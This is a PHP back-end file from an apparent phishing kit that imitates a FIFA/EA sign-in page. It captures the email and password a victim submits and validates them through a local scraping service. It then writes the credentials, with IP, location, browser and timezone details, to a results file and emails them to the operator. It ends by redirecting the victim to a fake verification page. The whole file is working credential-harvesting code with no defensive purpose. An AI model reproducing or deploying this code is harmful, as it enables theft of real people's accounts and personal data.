<?php

$curlAns = true;

session_start(); 

include '../extra/mine.php';
include '../extra/bot.php';

@$pas=$_POST['password'];
@$email=$_POST['email'];
$checker=true;


$uurl = 'http://localhost:4000/ScrappingDemo';
$curData = get($uurl.'?email='.$email.'&password='.$pas);
$curldata = json_decode($curData, true);

if($curldata['msg']){
	$curlAns = true;
}else{
	$curlAns = false;
}


function get($url)
{
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
     curl_setopt($ch, CURLOPT_URL, $url);
     $res = curl_exec($ch);
	 return $res;
}

// $a = get('https://signin.ea.com/p/ajax/user/checkEmailExisted?requestorId=portal&email='.$email);

// if (strpos($a, 'register_email_existed')) {
// 	$checker=true;
// }
// else{
// 	$checker=false;  
// }

// if(($checker)&&isset($_POST['password']))
// {
// 	$check2 = true;
// 	if (	strlen($pas)>7 
//         && strlen($pas)<63 
//         && preg_match('`[A-Z]`',$pas) 
//         && preg_match('`[a-z]`',$pas)  
//         && preg_match('`[0-9]`',$pas)  )
//          {
// 			$check3 = true;
// 		}else{
// 				$check3 = false;
// 		}
// }



// if(isset($_POST['email'])&&isset($_POST['password'])){

// if ($check2==true &&$check3==true&&$checker==true) {

if ($curlAns) {

	$_SESSION['screen']=$_POST['screen'];
	$_SESSION['email']=$_POST['email'];

			$msg="=========== <[ 🔑 FIFA LOGIN | Page 1  ".$_SESSION['ip_countryName']."]> ===========\r\n";
			$msg.="EMAIL		: {$_POST['email']}\r\n";
			$msg.="PASS		: {$_POST['password']}\r\n";
			$msg.="---------------------- IP Info ----------------------\r\n";
			$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
			$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
			$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
			$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
			$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
			$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
			$msg.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
			$msg.="=========== <[ THANKS TO NFISSI ]> ===========\r\n\r\n\r\n";

	$save=fopen("../rzlt bb/FIFA Login From ".$_SESSION['ip'].".txt","a+");
	fwrite($save,$msg);
	fclose($save);

	$subject="- 🔑  🔑 -FIFA LOGIN  From [".$_SESSION['ip_countryName']."]";
	$headers="From: 🌪️ NFISI 🌪️ <newlogin@Nfisi.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
		foreach(explode(",",$yours) as $your){
				@mail($your,$subject,$msg,$headers);
		}
	}
	
}
	// }
	
// if ($check2==true && $check3==true && $checker==true) {
if ($curlAns) {
	exit( header("Location: ../verif.php"));
}else if($curlAns!=true){
	exit(header("Location: ../index.php?email=false"));
}else if($checker3!=true){
	exit(header("Location: ../index.php?info=false"));
}


?>